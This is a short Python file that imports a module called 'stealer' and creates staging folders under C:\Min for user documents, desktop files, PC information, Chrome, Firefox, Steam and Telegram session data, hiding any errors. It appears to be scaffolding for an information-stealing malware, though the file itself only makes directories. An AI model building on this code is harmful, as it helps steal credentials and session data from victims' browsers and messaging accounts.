import stealer

def create_all():
    try:
        stealer.create_directory_if_not_exists(r'C:\Min\texts\documents')
        stealer.create_directory_if_not_exists(r'C:\Min\texts\downloads')
        stealer.create_directory_if_not_exists(r'C:\Min\texts\desktop')
        stealer.create_directory_if_not_exists(r'C:\Min\Pc-information')
        stealer.create_directory_if_not_exists(r'C:\Min\GoogleChr')
        stealer.create_directory_if_not_exists(r'C:\Min\Steam')
        stealer.create_directory_if_not_exists(r'C:\Min\Firefox')
        stealer.create_directory_if_not_exists(r'C:\Min\Telegram\tdata')
    except:
        pass